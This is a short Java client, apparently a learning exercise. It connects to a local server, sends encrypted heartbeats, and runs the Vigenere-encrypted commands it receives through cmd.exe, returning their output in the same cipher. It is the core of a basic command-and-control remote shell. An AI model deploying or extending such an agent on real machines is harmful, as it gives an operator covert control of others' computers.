import java.io.*;
import java.net.*;
import java.util.concurrent.LinkedBlockingQueue;



public class Client {

    static final VigenereCipher cipher = new VigenereCipher("secretkey");
    static final LinkedBlockingQueue<String> commandQueue = new LinkedBlockingQueue<>(); //geekforgeeks https://www.geeksforgeeks.org/java/linkedblockingqueue-class-in-java/


    public static void main(String[] args) throws IOException {
        try (Socket socket = new Socket("localhost", 5000)) {
            System.out.println("Connected to server");

            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter out = new PrintWriter(socket.getOutputStream(),true);

            //heartbeat
            Thread heartbitThread = new Thread(()-> {
                try {
                    while (!socket.isClosed() && out != null) {
                        Thread.sleep(5000);
                        out.println(cipher.encrypt("HEARTBEAT"));
                    }
                } catch (Exception e) {
                    System.out.println("heartbeat stopped");
                }
                
            });
            heartbitThread.start();

            Thread processorThread = new Thread(() -> {
                try {
                    while (true) {
                        String cmd = commandQueue.take(); // waits for command
                        System.out.println("Processing: " + cmd);

                        // execute kill command
                        if (cmd.equals("KILL")) {
                            System.out.println("Server ordered termination. Closing client.");
                            socket.close();
                            return;
                        }

                        // execute bash command
                        String output = executeCommand(cmd);
                        out.println(cipher.encrypt(output));
                        System.out.println("Sent back: " + output);

                        // default echo is unnecessary because echo already exists as a built-in bash command
                        // } else if (command.equals("ECHO")){
                        //     System.out.println("Server ordered echo response from the client.");
                        //     String returnMsg = "Hello World";
                        //     System.out.println(returnMsg);
                        //     out.println(cipher.encrypt(returnMsg));
                        //     System.out.println("sending back to server " + returnMsg);
                    }
                } catch (Exception e) {
                    System.out.println("Processor stopped");
                }
            });
            processorThread.start();

           
            // main receive loop
            String encryptCommand;
            while ((encryptCommand = in.readLine()) != null) {
                String command = cipher.decrypt(encryptCommand);
                commandQueue.put(command);
                
            }
    
            socket.close();
        } catch (Exception e) {
            System.out.println("Server disconnected");
        } 
    }


    //stack over flow - https://www.geeksforgeeks.org/java/java-runtime-exec-method/
    private static String executeCommand(String command) {
        command = command.toLowerCase();
        Process process;
        StringBuilder result = new StringBuilder();
        try {
            process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", command});
        
            BufferedReader reader =  new BufferedReader(new InputStreamReader(process.getInputStream()));
            
            String line = "";
            while((line = reader.readLine()) != null) {
                result.append(line).append("\n");
            }   

            process.waitFor();   
            
        } catch (Exception e) {
            result.append("error while proccessing the command");
        }

        return result.toString();

    }
}
